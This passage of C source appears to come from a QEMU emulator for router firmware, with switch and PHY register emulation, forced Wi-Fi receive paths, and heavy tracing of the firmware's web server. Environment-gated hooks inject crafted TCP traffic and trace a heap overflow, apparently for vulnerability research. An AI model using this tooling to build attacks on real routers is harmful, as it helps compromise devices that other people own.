    const LeopardAr8337RegDefault *def = leopard_ar8337_default_by_reg(key);

    return def ? def->val : 0;
}

static bool ar_mdio_window(unsigned phy, unsigned reg, uint16_t *sw_addr,
                           bool *high_half)
{
    if (reg < 0x10 || reg > 0x17) {
        return false;
    }
    *sw_addr = ((reg - 0x10) << 5) | (phy & 0x1e);
    *high_half = phy & 1;
    return true;
}

static uint16_t ar_read_half(unsigned phy, unsigned reg)
{
    uint16_t sw_addr;
    bool high_half;
    if (!ar_mdio_window(phy, reg, &sw_addr, &high_half)) {
        return 0xffff;
    }
    uint32_t *slot = ar_reg_slot(sw_addr, 0);
    uint32_t val = slot ? *slot : ar_reg_default(sw_addr);
    const LeopardAr8337RegDefault *def =
        leopard_ar8337_default_by_reg(sw_addr);

    if (def) {
        val |= def->force_set;
        val &= ~def->force_clear;
        if (slot) {
            *slot = val;
        }
    } else if (sw_addr == 0x001e) {
        /* MDIO operation register BUSY bit: complete immediately. */
        val &= ~0x80000000u;
        if (slot) {
            *slot = val;
        }
    }
    return high_half ? (val >> 16) : (val & 0xffff);
}

static void ar_write_half(unsigned phy, unsigned reg, uint16_t data)
{
    uint16_t sw_addr;
    bool high_half;
    if (!ar_mdio_window(phy, reg, &sw_addr, &high_half)) {
        return;
    }
    uint32_t *slot = ar_reg_slot(sw_addr, 1);
    if (!slot) {
        return;
    }
    if (high_half) {
        *slot = (*slot & 0x0000ffffu) | ((uint32_t)data << 16);
    } else {
        *slot = (*slot & 0xffff0000u) | data;
    }
}

static void mdio_init_phy(unsigned phy)
{
    /* Plausible Marvell-style PHY ID (88E1310-ish) on every address. */
    mdio.phy_reg[phy][0]  = 0x1140;   /* BMCR: AN_ENABLE | DUPLEX | SPEED1000 */
    mdio.phy_reg[phy][1]  = 0x796d;   /* BMSR: 100/10 cap | EXT_STATUS | AN_COMPLETE
                                         | AN_ABILITY | LINK_UP | EXT_REGS */
    mdio.phy_reg[phy][2]  = 0x0141;   /* PHYID1 = OUI Marvell */
    mdio.phy_reg[phy][3]  = 0x0e70;   /* PHYID2 = 88E1310 model */
    mdio.phy_reg[phy][4]  = 0x05e1;   /* ANAR: 100FD/100HD/10FD/10HD + 802.3 */
    mdio.phy_reg[phy][5]  = 0x45e1;   /* ANLPAR: link partner same + ack */
    mdio.phy_reg[phy][6]  = 0x000f;   /* ANER: page-rx + lp-an-able + lp-np */
    mdio.phy_reg[phy][9]  = 0x0200;   /* GBCR: advertise 1000FD */
    mdio.phy_reg[phy][10] = 0x7800;   /* GBSR: lp-1000FD | local-rx-ok |
                                         remote-rx-ok | local-cfg-master */
    mdio.phy_reg[phy][15] = 0x3000;   /* EXSR: 1000FD/1000HD capable */
    mdio.phy_reg[phy][16] = 0xac00;
    /* Gen-purpose status (Marvell 88E1xxx PHY-specific register 17):
     *   bit 11 = link real-time, bit 10 = duplex, bits 14:8 speed code 010=1Gb */
    mdio.phy_reg[phy][17] = 0xac00;   /* speed=1Gb | duplex-FD | link-up | resolved */
}

static uint64_t mdio_read(void *opaque, hwaddr off, unsigned size)
{
    if (off == MDIO_REG) {
        return (mdio.cmd & ~0x8000FFFFu) | mdio.last_data;
    }
    return 0;
}
static void mdio_write(void *opaque, hwaddr off,
                       uint64_t val, unsigned size)
{
    if (off != MDIO_REG) return;
    if (!mdio.phy_init) {
        const char *p = getenv("LEOPARD_MDIO_LOG");
        if (!p) p = "/tmp/leopard_mdio.log";
        mdio.log_f = fopen(p, "w");
        for (unsigned a = 0; a < 32; a++) mdio_init_phy(a);
        mdio.phy_init = 1;
    }
    uint32_t v = val;
    mdio.cmd = v & ~0x80000000u;       /* clear BUSY immediately */
    if (v & 0x80000000u) {
        unsigned op  = (v >> 18) & 3;
        unsigned phy = (v >> 25) & 0x1f;
        unsigned reg = (v >> 20) & 0x1f;
        unsigned data = v & 0xffff;
        const char *opname = "?";
        const char *note = "";
        /* Indirect-access channel: reg=29 on PHY addrs 21/23/24/25/31. */
        if (reg == 29 && (phy == 21 || phy == 23 || phy == 24 ||
                          phy == 25 || phy == 31)) {
            if (op == 1) {              /* write */
                opname = "wr";
                if (phy == 31) { mdio.ind_page  = data; note = "page"; }
                else if (phy == 23) { mdio.ind_addr  = data; note = "addr"; }
                else if (phy == 24) { mdio.ind_wdata = data; note = "wdat"; }
                else if (phy == 21) {
                    note = "trig";
                    uint32_t key = ((uint32_t)mdio.ind_page << 16)
                                 | mdio.ind_addr;
                    if (data == 0x0003) {
                        uint16_t *s = sw_reg_slot(key, 1);
                        if (s) *s = mdio.ind_wdata;
                        note = "trig-WR";
                    } else if (data == 0x0001) {
                        uint16_t *s = sw_reg_slot(key, 0);
                        mdio.ind_result = s ? *s : sw_reg_default(key);
                        note = "trig-RD";
                    }
                }
                mdio.last_data = data;
            } else if (op == 2) {       /* read */
                opname = "rd";
                if (phy == 25) {
                    mdio.last_data = mdio.ind_result;
                    note = "result";
                } else {
                    /* read-back of latched fields */
                    if      (phy == 31) mdio.last_data = mdio.ind_page;
                    else if (phy == 23) mdio.last_data = mdio.ind_addr;
                    else if (phy == 24) mdio.last_data = mdio.ind_wdata;
                    else                mdio.last_data = 0;
                }
            } else {
                opname = (op == 0) ? "c45a" : "c45r";
                mdio.last_data = (op == 0) ? data : 0xffff;
            }
        } else if (op == 1) {           /* standard C22 write */
            if (ar_mdio_window(phy, reg, &(uint16_t){0}, &(bool){0})) {
                ar_write_half(phy, reg, data);
            } else {
                mdio.phy_reg[phy][reg] = data;
            }
            mdio.last_data = data;
            opname = "wr";
        } else if (op == 2) {           /* standard C22 read */
            if (ar_mdio_window(phy, reg, &(uint16_t){0}, &(bool){0})) {
                mdio.last_data = ar_read_half(phy, reg);
                note = "ar8337";
            } else {
                mdio.last_data = mdio.phy_reg[phy][reg];
            }
            opname = "rd";
        } else {                        /* C45 addr/read — stub */
            mdio.last_data = (op == 0) ? data : 0xffff;
            opname = (op == 0) ? "c45a" : "c45r";
        }
        if (mdio.log_f) {
            fprintf(mdio.log_f,
                    "[mdio] %-4s phy=%2u reg=%2u data=%#06x -> %#06x"
                    "  %s%s%s [pg=%#x ad=%#x]\n",
                    opname, phy, reg, data, mdio.last_data,
                    note[0] ? "(" : "", note, note[0] ? ")" : "",
                    mdio.ind_page, mdio.ind_addr);
            fflush(mdio.log_f);
        }
        if (mdio.log_n < 64) {
            mdio.log_n++;
            fprintf(stderr, "[mdio] %s phy=%u reg=%u data=%#x -> %#x %s\n",
                    opname, phy, reg, data, mdio.last_data, note);
        }
    }
}
static const MemoryRegionOps mdio_ops = {
    .read = mdio_read,
    .write = mdio_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
    .valid.min_access_size = 4,
    .valid.max_access_size = 4,
};

/* The RTOS keeps its OS tick in plain RAM at 0x407130f0 (a 64-bit
 * counter) and bumps it from the CP15 arch-timer ISR. Some early-boot
 * delay loops run with CPSR I-bit set, so the ISR never runs and the
 * tick never advances — they hang forever. Bypass by writing the tick
 * variable directly from a host-side periodic timer at the same rate
 * the firmware expects (~CP15 counter rate, ~62.5 MHz). */
#define LEOPARD_TICK64_ADDR  0x407130f0
#define LEOPARD_TICK64_HZ    62500000ULL
static QEMUTimer *leopard_tick_timer;
static void leopard_tick_cb(void *opaque)
{
    int64_t ns = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);
    uint64_t v = (uint64_t)ns * LEOPARD_TICK64_HZ / 1000000000ULL;
    address_space_write(&address_space_memory, LEOPARD_TICK64_ADDR,
                        MEMTXATTRS_UNSPECIFIED, &v, sizeof(v));
    timer_mod(leopard_tick_timer, ns + 1000000); /* 1 ms */
}

/* Deferred ARP-reply infrastructure: see leopard_fe_receive's ARP
 * auto-reply block.  We can't call qemu_send_packet re-entrantly from
 * the receive callback, so we stash the reply and fire it from a
 * one-shot timer ~100us later. */
static uint8_t       leopard_arp_reply[42];
static NICState     *leopard_arp_nic;
static QEMUTimer    *leopard_arp_send_timer;
static void leopard_arp_send_cb(void *opaque)
{
    if (leopard_arp_nic) {
        qemu_send_packet(qemu_get_queue(leopard_arp_nic),
                         leopard_arp_reply, sizeof(leopard_arp_reply));
    }
}

/* PC sampler: every N ms log current PC + LR.  Useful for diagnosing
 * boot hangs without GDB - if the firmware sits in a tight loop, the
 * sampled PCs will cluster in that loop. */
static QEMUTimer *leopard_pc_sample_timer;
static int        leopard_pc_sample_n;
static bool       leopard_wifi_rx_consumer_forced;
static unsigned   leopard_wifi_rx_consumer_force_count;
static bool       leopard_wifi_rx_file_filled_at_ready_idle;
static unsigned   leopard_wifi_poc_rx_pending;
typedef struct LeopardFEState LeopardFEState;
static LeopardFEState *leopard_fe_singleton;
static void leopard_fe_start_tcp_tiny_mss_now(LeopardFEState *s,
                                              const char *why);
static bool leopard_wifi_long_fold_after_httpd_pending;
static bool leopard_wifi_long_fold_after_phase2_pending;
/* Track whether each watched PC range has been observed at any sample tick. */
static bool leopard_seen_lanstart;
static bool leopard_seen_ifexec;
static bool leopard_active_body_overflow_seen;
static uint32_t leopard_debug_read32(uint32_t addr);
static uint8_t leopard_debug_read8(uint32_t addr);
static void leopard_debug_write8(uint32_t addr, uint8_t val);

static bool leopard_parse_mac_env(const char *text, uint8_t mac[6])
{
    unsigned int b[6];

    if (!text || !*text) {
        return false;
    }
    if (sscanf(text, "%x:%x:%x:%x:%x:%x",
               &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) {
        return false;
    }
    for (int i = 0; i < 6; i++) {
        if (b[i] > 0xff) {
            return false;
        }
        mac[i] = b[i];
    }
    return true;
}

static void leopard_wifi_seed_mbss_bssid(uint32_t adapter)
{
    const char *env = getenv("LEOPARD_WIFI_MBSS_BSSID");
    uint8_t mac[6];
    uint8_t count;

    if (!leopard_parse_mac_env(env, mac)) {
        return;
    }
    count = leopard_debug_read8(adapter + 0xad75a);
    for (uint32_t i = 0; i < count && i < 16; i++) {
        uint32_t bssid = adapter + 0xad780 + i * 0x1e30;
        uint32_t wdev = leopard_debug_read32(adapter + 0xad760 + i * 0x1e30);

        for (uint32_t j = 0; j < sizeof(mac); j++) {
            leopard_debug_write8(bssid + j, mac[j]);
        }
        if (wdev) {
            leopard_debug_write32(wdev + 0x2c,
                                  leopard_debug_read32(wdev + 0x2c) | 1);
        }
    }
    if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
        fprintf(stderr,
                "[wifi-mcu] seeded mbss bssid %02x:%02x:%02x:%02x:%02x:%02x "
                "count=%u adapter=%#x\n",
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
                count, adapter);
    }
}

static bool leopard_wifi_adapter_rx_ready(uint32_t adapter)
{
    uint32_t pend = leopard_debug_read32(adapter + 0x33c5e8);

    if (!pend) {
        return false;
    }

    return leopard_debug_read32(pend + 0xb80 + 0x16c) != 0 &&
           leopard_debug_read32(pend + 0xb80 + 0x170) != 0 &&
           leopard_debug_read32(pend + 0xb80 + 0x174) != 0 &&
           leopard_debug_read32(pend + 0xb80 + 0x178) != 0;
}

static uint32_t leopard_wifi_force_rx_entry(void)
{
    const char *entry_env = getenv("LEOPARD_WIFI_FORCE_RX_ENTRY");

    if (entry_env && *entry_env) {
        return (uint32_t)strtoul(entry_env, NULL, 0);
    }
    return 0x402f0c2c;
}

static void leopard_pc_sample_cb(void *opaque)
{
    CPUState *cs = qemu_get_cpu(0);
    if (cs) {
        ARMCPU *acpu = ARM_CPU(cs);
        uint32_t pc = acpu->env.regs[15];
        uint32_t lr = acpu->env.regs[14];
        uint32_t sp = acpu->env.regs[13];
        if (!leopard_wifi_rx_consumer_forced &&
            getenv("LEOPARD_WIFI_FORCE_RX_CONSUMER_AT_WAIT") &&
            pc == 0x40256b28) {
            const char *adapter_env = getenv("LEOPARD_WIFI_ADAPTER");
            uint32_t adapter = adapter_env && *adapter_env
                ? (uint32_t)strtoul(adapter_env, NULL, 0)
                : 0x416d5784;

            leopard_wifi_rx_consumer_forced = true;
            if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
                fprintf(stderr,
                        "[wifi-mcu] force-rx-consumer-at-wait adapter=%#x "
                        "entry=%#x pc=%#x lr=%#x\n",
                        adapter, leopard_wifi_force_rx_entry(), pc, lr);
            }
            leopard_connsys_fill_rx_file_at_wait();
            acpu->env.regs[0] = adapter;
            acpu->env.regs[14] = pc;
            acpu->env.regs[15] = leopard_wifi_force_rx_entry();
            pc = acpu->env.regs[15];
            lr = acpu->env.regs[14];
        }
        if (getenv("LEOPARD_WIFI_FORCE_RX_CONSUMER_AT_READY_IDLE") &&
            pc == 0x40205568) {
            const char *adapter_env = getenv("LEOPARD_WIFI_ADAPTER");
            const char *limit_env = getenv("LEOPARD_WIFI_FORCE_RX_CONSUMER_LIMIT");
            bool only_poc = getenv("LEOPARD_WIFI_FORCE_RX_CONSUMER_ONLY_AFTER_POC");
            unsigned limit = limit_env && *limit_env
                ? (unsigned)strtoul(limit_env, NULL, 0)
                : 1;
            uint32_t adapter = adapter_env && *adapter_env
                ? (uint32_t)strtoul(adapter_env, NULL, 0)
                : 0x416d5784;

            if (getenv("LEOPARD_INJECT_WIFI_TCP_LONG_FOLD") &&
                leopard_fe_singleton &&
                leopard_wifi_adapter_rx_ready(adapter)) {
                leopard_fe_start_tcp_tiny_mss_now(leopard_fe_singleton,
                                                  "wlan ready-idle");
            }
            if (leopard_wifi_rx_consumer_force_count < limit &&
                (!only_poc || leopard_wifi_poc_rx_pending) &&
                leopard_wifi_adapter_rx_ready(adapter)) {
                uint32_t pend = leopard_debug_read32(adapter + 0x33c5e8);

                leopard_wifi_rx_consumer_forced = true;
                leopard_wifi_rx_consumer_force_count++;
                if (leopard_wifi_poc_rx_pending) {
                    leopard_wifi_poc_rx_pending--;
                }
                leopard_wifi_seed_mbss_bssid(adapter);
                if (getenv("LEOPARD_WIFI_MCU_TRACE")) {
                    fprintf(stderr,
                            "[wifi-mcu] force-rx-consumer-at-ready-idle "
                            "adapter=%#x pEnd=%#x entry=%#x count=%u/%u "
                            "pc=%#x lr=%#x\n",
                            adapter, pend, leopard_wifi_force_rx_entry(),
                            leopard_wifi_rx_consumer_force_count, limit,
                            pc, lr);
                }
                if (!getenv("LEOPARD_WIFI_FAKE_RX_FILE_FILL_ONCE") ||
                    !leopard_wifi_rx_file_filled_at_ready_idle) {
                    leopard_connsys_fill_rx_file_at_wait();
                    leopard_wifi_rx_file_filled_at_ready_idle = true;
                }
                acpu->env.regs[0] = adapter;
                acpu->env.regs[14] = pc;
                acpu->env.regs[15] = leopard_wifi_force_rx_entry();
                pc = acpu->env.regs[15];
                lr = acpu->env.regs[14];
            }
        }
        if (getenv("LEOPARD_PC_SAMPLE_TRACE")) {
            if (leopard_pc_sample_n < 200) {
                fprintf(stderr, "[pc-sample] pc=%#x lr=%#x sp=%#x\n",
                        pc, lr, sp);
            } else if (leopard_pc_sample_n % 4000 == 0) {
                /* After warmup, print every 4000th sample (~200ms at 50us)
                 * to expose late-boot hang points. */
                fprintf(stderr,
                        "[pc-sample-late n=%d] pc=%#x lr=%#x sp=%#x\n",
                        leopard_pc_sample_n, pc, lr, sp);
            }
        }
        leopard_pc_sample_n++;
        if (leopard_active_body_overflow_seen && getenv("LEOPARD_HEAP_TRACE")) {
            static int heap_trace_n;
            for (int ci = 0; ci < 2; ci++) {
                CPUState *tcs = qemu_get_cpu(ci);
                ARMCPU *tcpu;
                uint32_t tpc;

                if (!tcs) {
                    continue;
                }
                tcpu = ARM_CPU(tcs);
                tpc = tcpu->env.regs[15];
                if (tpc == 0x404a9604 || tpc == 0x4056ccd0 ||
                    tpc == 0x4056cc10 || tpc == 0x4056c08c ||
                    tpc == 0x4056bf58 || tpc == 0x4056c010 ||
                    tpc == 0x4056c0d0 || tpc == 0x4056c284 ||
                    tpc == 0x4056c4bc || tpc == 0x40561e34) {
                    if (heap_trace_n++ < 200) {
                        fprintf(stderr,
                                "[heap-trace cpu=%d n=%d] pc=%#x lr=%#x "
                                "r0=%#x r1=%#x r2=%#x r3=%#x "
                                "r4=%#x r5=%#x sp=%#x\n",
                                ci, heap_trace_n, tpc, tcpu->env.regs[14],
                                tcpu->env.regs[0], tcpu->env.regs[1],
                                tcpu->env.regs[2], tcpu->env.regs[3],
                                tcpu->env.regs[4], tcpu->env.regs[5],
                                tcpu->env.regs[13]);
                    }
                }
            }
        }
        if (getenv("LEOPARD_INJECT_WIFI_TCP_LONG_FOLD_AFTER_HTTPD") &&
            pc == 0x4048c580) {
            leopard_wifi_long_fold_after_httpd_pending = true;
        }
        if (getenv("LEOPARD_INJECT_WIFI_TCP_LONG_FOLD_AFTER_PHASE2") &&
            pc == 0x4048c52c) {
            leopard_wifi_long_fold_after_phase2_pending = true;
        }
        if (leopard_wifi_long_fold_after_httpd_pending &&
            pc == 0x40205568 &&
            leopard_fe_singleton &&
            leopard_wifi_adapter_rx_ready(0x416d5784)) {
            leopard_wifi_long_fold_after_httpd_pending = false;
            leopard_fe_start_tcp_tiny_mss_now(leopard_fe_singleton,
                                              "post-httpd idle");
        }
        if (leopard_wifi_long_fold_after_phase2_pending &&
            pc == 0x40205568 &&
            leopard_fe_singleton &&
            leopard_wifi_adapter_rx_ready(0x416d5784)) {
            leopard_wifi_long_fold_after_phase2_pending = false;
            leopard_fe_start_tcp_tiny_mss_now(leopard_fe_singleton,
                                              "post-phase2 idle");
        }
        if (getenv("LEOPARD_READLINE_TRACE")) {
            static int n[2];
            for (int ci = 0; ci < 2; ci++) {
                CPUState *tcs = qemu_get_cpu(ci);
                ARMCPU *tcpu;
                uint32_t tpc;

                if (!tcs) {
                    continue;
                }
                tcpu = ARM_CPU(tcs);
                tpc = tcpu->env.regs[15];
                if (tpc < 0x4045d058 || tpc >= 0x4045d384) {
                    continue;
                }
                if (n[ci] < 200 || (n[ci] % 1000) == 0) {
                    uint32_t saved_addr = tcpu->env.regs[11] - 0x24;
                    fprintf(stderr,
                        "[readline-trace cpu=%d n=%d] pc=%#x lr=%#x "
                        "r0=%#x r1=%#x r2=%#x r4=%#x r5=%#x r6=%#x "
                        "r11=%#x saved@%#x byte=%#x word=%#x\n",
                        ci, n[ci], tpc, tcpu->env.regs[14],
                        tcpu->env.regs[0], tcpu->env.regs[1],
                        tcpu->env.regs[2], tcpu->env.regs[4],
                        tcpu->env.regs[5], tcpu->env.regs[6],
                        tcpu->env.regs[11], saved_addr,
                        leopard_debug_read8(saved_addr),
                        leopard_debug_read32(saved_addr));
                }
                n[ci]++;
            }
        }
        /* Capture the two strcmp args at FUN_403FC47C's final compare.
         * pc=0x403FC508 is `bl 0x405074EC` (strcmp).
         * r0 = first arg (= fp-0xcc = buf_d4+8 from sprintf_like(0xb))
         * r1 = second arg (= buf_60+0x21 or buf_a8 from sprintf_like(100/1))
         * Knowing the strings tells us if any request shape can match. */
        if (pc == 0x403FC508) {
            static int hits;
            if (hits < 5) {
                hits++;
                uint32_t r0v = acpu->env.regs[0];
                uint32_t r1v = acpu->env.regs[1];
                char a[80] = {0}, b[80] = {0};
                if (r0v) cpu_physical_memory_read(r0v, a, sizeof(a)-1);
                if (r1v) cpu_physical_memory_read(r1v, b, sizeof(b)-1);
                fprintf(stderr,
                  "[fc47c-strcmp] r0=%#x \"%s\" r1=%#x \"%s\"\n",
                  r0v, a, r1v, b);
            }
        }
        /* Track the high-water-mark PC inside wlan_start's body
         * (0x403C87C0..0x403C8AB0). Tells us how far wlan's start
         * handler progresses before the lifecycle stalls there.
         * Also track LR while inside, to identify synchronous BL
         * destinations from inside the function. */
        {
            static uint32_t wlan_high_pc;
            static uint32_t wlan_high_lr;
            static int wlan_seen, wlan_dumped;
            if (pc >= 0x403C87C0 && pc < 0x403C8AB0) {
                wlan_seen++;
                if (pc > wlan_high_pc) {
                    wlan_high_pc = pc;
                    wlan_high_lr = lr;
                }
            }
            /* After a long quiet period (warmup + many late ticks),
             * report once. */
            if (!wlan_dumped && leopard_pc_sample_n == 50000) {
                wlan_dumped = 1;
                fprintf(stderr,
                    "[wlan-progress] seen=%d high_pc=%#x high_lr=%#x\n",
                    wlan_seen, wlan_high_pc, wlan_high_lr);
            }
        }
        /* Catch every distinct LR observed while PC is anywhere
         * inside FUN_403C87C0 (wlan_start). Each unique LR is a
         * BL return target inside wlan_start. The set of LRs tells
         * us which BL sites get past, and which one is the last
         * before the hang. */
        if (pc >= 0x403C87C0 && pc < 0x403C8AB0) {
            static uint32_t lrs[32];
            static int n_lrs;
            int found = 0;
            for (int i = 0; i < n_lrs; i++) if (lrs[i] == lr) { found = 1; break; }
            if (!found && n_lrs < 32) {
                lrs[n_lrs++] = lr;
                fprintf(stderr,
                    "[wlan-lr] new lr=%#x at pc=%#x (n=%d total=%d)\n",
                    lr, pc, leopard_pc_sample_n, n_lrs);
            }
        }
        /* Did ctrlAppStart's blx site at 0x4048B5B8 ever return?
         * The instruction after the blx is at 0x4048B5BC; the loop
         * increment begins around 0x4048B5BC..0x4048B5DC. If PC is
         * never seen here for wlan iteration, wlan's start handler
         * never returned. */
        if (pc >= 0x4048B5BC && pc <= 0x4048B5DC) {
            static int hits;
            if (hits < 5) {
                hits++;
                fprintf(stderr,
                    "[ctrlAppStart-postblx] pc=%#x lr=%#x at n=%d\n",
                    pc, lr, leopard_pc_sample_n);
            }
        }
        /* Once the lifecycle is past the systool/wlan stage,
         * dump the Handlers struct addresses for each app so we
         * know all the per-app phase handlers (Reset/Init/Start/...). */
        {
            static int dumped_apps;
            if (!dumped_apps && leopard_pc_sample_n == 30000) {
                dumped_apps = 1;
                /* App entries: name@entry+4, handlers_ptr@entry+0x224 */
                static const struct { const char *name; uint32_t addr; } apps[] = {
                    {"main",      0x407329F4},
                    {"forward",   0x40732C28},
                    {"systool",   0x40732358},
                    {"wlan",      0x407327C0},
                    {"wan",       0x40731EF0},
                    {"advanced",  0x4073372C},
                    {"mesh",      0x40732E5C},
                    {"onemesh",   0x40732124},
                    {"emesh",     0x40733960},
                    {"cwmp",      0x4073258C},
                    {"apsd",      0x40733B94},
                    {"tpapp",     0x407332C4},
                    {"portal",    0x40733090},
                    {"smartHome", 0x407334F8},
                    {NULL, 0}
                };
                /* Dump the JSON-API handler table at 0x40683B8C
                 * (8-byte slots indexed by uVar4 in FUN_403FF1F0;
                 * each slot = (handler_ptr, aux_check_ptr)). */
                fprintf(stderr, "[api-handler-table @ 0x40683B8C]\n");
                for (int i = 0; i < 32; i++) {
                    uint32_t pair[2] = {0};
                    cpu_physical_memory_read(0x40683B8C + i * 8,
                                             pair, sizeof(pair));
                    if (pair[0] || pair[1]) {
                        fprintf(stderr,
                            "  slot[%d] @ %#x: handler=%#x aux=%#x\n",
                            i, 0x40683B8C + i * 8, pair[0], pair[1]);
                    }
                }
                fprintf(stderr, "[app-handlers-dump]\n");
                for (int i = 0; apps[i].name; i++) {
                    uint32_t handlers_ptr = 0;
                    cpu_physical_memory_read(apps[i].addr + 0x224,
                                             &handlers_ptr, 4);
                    if (handlers_ptr == 0) {
                        fprintf(stderr, "  %-10s entry=%#x handlers=NULL\n",
                                apps[i].name, apps[i].addr);
                        continue;
                    }
                    uint32_t hh[6] = {0};
                    cpu_physical_memory_read(handlers_ptr, hh, sizeof(hh));
                    fprintf(stderr,
                        "  %-10s entry=%#x handlers=%#x  reset=%#x init=%#x start=%#x +c=%#x +10=%#x +14=%#x\n",
                        apps[i].name, apps[i].addr, handlers_ptr,
                        hh[0], hh[1], hh[2], hh[3], hh[4], hh[5]);
                }
            }
        }
        /* When PC is in the RTOS scheduler / yield code, record LR
         * — that's the address inside whatever task function is
         * yielding. The set of distinct LRs seen tells us which
         * functions are sleeping. */
        if (pc >= 0x40205000 && pc < 0x40205800) {
            static uint32_t lrs[64]; static uint32_t lr_count[64]; static int n_lrs;
            int found = -1;
            for (int i = 0; i < n_lrs; i++) if (lrs[i] == lr) { found = i; break; }
            if (found < 0 && n_lrs < 64) {
                lrs[n_lrs] = lr; lr_count[n_lrs] = 1; n_lrs++;
                fprintf(stderr,
                    "[sched-yield-lr] new lr=%#x at pc=%#x (n=%d total=%d)\n",
                    lr, pc, leopard_pc_sample_n, n_lrs);
            } else if (found >= 0) {
                lr_count[found]++;
            }
            /* Periodically dump top yield LRs (the blockers). */
            if (leopard_pc_sample_n == 80000) {
                fprintf(stderr, "[sched-yield-summary] %d distinct LRs:\n", n_lrs);
                for (int i = 0; i < n_lrs; i++) {
                    if (lr_count[i] >= 50) {
                        fprintf(stderr, "   lr=%#x  count=%u\n",
                                lrs[i], lr_count[i]);
                    }
                }
            }
        }
        /* Trace httpd route-registration callsites — pin down whether
         * FUN_4045F954 actually executed its route loop. */
        if (pc == 0x40460784 || pc == 0x40460808) {
            static int n;
            if (n < 50) {
                fprintf(stderr,
                    "[httpd-route] pc=%#x lr=%#x r0=%#x r1=%#x r2=%#x\n",
                    pc, lr, acpu->env.regs[0], acpu->env.regs[1],
                    acpu->env.regs[2]);
                n++;
            }
        }
        /* Trace httpdProcessRequest's call to the dir-finder
         * (0x40460648) and its return.  This pins down what the lookup
         * sees at request time. */
        if (pc == 0x4045d440 || pc == 0x4045d444 || pc == 0x4045d448) {
            static int n;
            if (n < 30) {
                /* Also read first 16 bytes of r1 (path) string. */
                uint32_t r0v = acpu->env.regs[0];
                uint32_t r1v = acpu->env.regs[1];
                char path[32] = {0};
                if (r1v) {
                    cpu_physical_memory_read(r1v, path, sizeof(path) - 1);
                    for (int i = 0; i < (int)sizeof(path) - 1; i++) {
                        if ((uint8_t)path[i] < 0x20 || (uint8_t)path[i] >= 0x7f) {
                            path[i] = 0; break;
                        }
                    }
                }
                fprintf(stderr,
                    "[httpd-pr] pc=%#x r0=%#x r1=%#x \"%s\" r2=%#x\n",
                    pc, r0v, r1v, path, acpu->env.regs[2]);
                n++;
            }
        }
        /* Trace value of *0x406906ac when it transitions to non-zero;
         * once it's set, dump the httpd-server struct it points to so
         * we can see whether the content list got populated. */
        {
            static uint32_t last_glob_val;
            static int dumped_struct;
            uint32_t v = 0;
            cpu_physical_memory_read(0x406906ac, &v, 4);
            if (v != last_glob_val) {
                fprintf(stderr,
                    "[httpd-glob-change] *(0x406906ac) = %#x  at n=%d  pc=%#x\n",
                    v, leopard_pc_sample_n, pc);
                last_glob_val = v;
            }
            /* Dump struct once after global is set + delay.
             *
             * Also: experimentally copy *(server+0xc) into server+0x108 so
             * `_httpd_findContentDir`-style lookups (which read [r0, #0x108])
             * find the populated dirroot tree.  Without this, the routes
             * registered into *(server+0xc)+0x100 are unreachable. */
            if (v && leopard_pc_sample_n >= 10000 && dumped_struct == 0) {
                dumped_struct = 1;
                uint32_t server_plus_c2 = 0;
                cpu_physical_memory_read(v + 0xc, &server_plus_c2, 4);
                if (server_plus_c2 >= 0x40000000 && server_plus_c2 < 0x42000000) {
                    cpu_physical_memory_write(v + 0x108, &server_plus_c2, 4);
                    fprintf(stderr,
                        "[httpd-fix-link] *(server+0x108) := *(server+0xc) = %#x\n",
                        server_plus_c2);
                }
                uint8_t blob[0x200];
                cpu_physical_memory_read(v, blob, sizeof(blob));
                fprintf(stderr, "[httpd-server-dump] @ %#x:\n", v);
                for (int j = 0; j < (int)sizeof(blob); j += 16) {
                    fprintf(stderr, "  +%03x:", j);
                    for (int k = 0; k < 16; k++) {
                        fprintf(stderr, " %02x", blob[j + k]);
                    }
                    fprintf(stderr, "\n");
                }
                /* Also dump *(server+0xc) + 0x100 which AddC inserts into. */
                uint32_t server_plus_c;
                memcpy(&server_plus_c, blob + 0xc, 4);
                fprintf(stderr, "[httpd-dirroot] *(server+0xc) = %#x\n",
                        server_plus_c);
                if (server_plus_c >= 0x40000000 && server_plus_c < 0x42000000) {
                    uint8_t b2[0x140];
                    cpu_physical_memory_read(server_plus_c, b2, sizeof(b2));
                    fprintf(stderr, "[httpd-dirroot-dump] @ %#x:\n", server_plus_c);
                    for (int j = 0; j < (int)sizeof(b2); j += 16) {
                        fprintf(stderr, "  +%03x:", j);
                        for (int k = 0; k < 16; k++) {
                            fprintf(stderr, " %02x", b2[j + k]);
                        }
                        fprintf(stderr, "\n");
                    }
                    /* Walk +0x100 list head: pointer to first dir entry. */
                    uint32_t list_head;
                    memcpy(&list_head, b2 + 0x100, 4);
                    fprintf(stderr, "[httpd-dirroot] +0x100 (dir list head) = %#x\n",
                            list_head);
                    if (list_head >= 0x40000000 && list_head < 0x42000000) {
                        uint8_t b3[0x214];
                        cpu_physical_memory_read(list_head, b3, sizeof(b3));
                        fprintf(stderr, "[dir-entry-dump] @ %#x:\n", list_head);
                        for (int j = 0; j < (int)sizeof(b3); j += 16) {
                            fprintf(stderr, "  +%03x:", j);
                            for (int k = 0; k < 16; k++) {
                                fprintf(stderr, " %02x", b3[j + k]);
                            }
                            fprintf(stderr, "\n");
                        }
                        uint32_t handler_list;
                        memcpy(&handler_list, b3 + 0x108, 4);
                        fprintf(stderr, "[dir-entry] +0x108 (handler list) = %#x\n",
                                handler_list);
                    }
                }
                /* Try walking pointer-list fields at offsets 0..0x1fc. */
                for (int o = 0; o < 0x200; o += 4) {
                    uint32_t p;
                    memcpy(&p, blob + o, 4);
                    if (p >= 0x40400000 && p < 0x40700000) {
                        char nm[32] = {0};
                        cpu_physical_memory_read(p, nm, sizeof(nm) - 1);
                        int printable = 1;
                        for (int k = 0; k < 8 && nm[k]; k++) {
                            if ((uint8_t)nm[k] < 0x20 ||
                                (uint8_t)nm[k] >= 0x7f) {
                                printable = 0; break;
                            }
                        }
                        if (printable && nm[0]) {
                            fprintf(stderr, "  +%03x -> %#x = \"%s\"\n",
                                    o, p, nm);
                        }
                    }
                }
            }
        }
        /* BLOB-TRACER: capture PC whenever execution is outside the host
         * RTOS code range (0x40205000 .. 0x40849510).  The first few
         * captures of LR show the host-side BL into the WiFi/mt7626
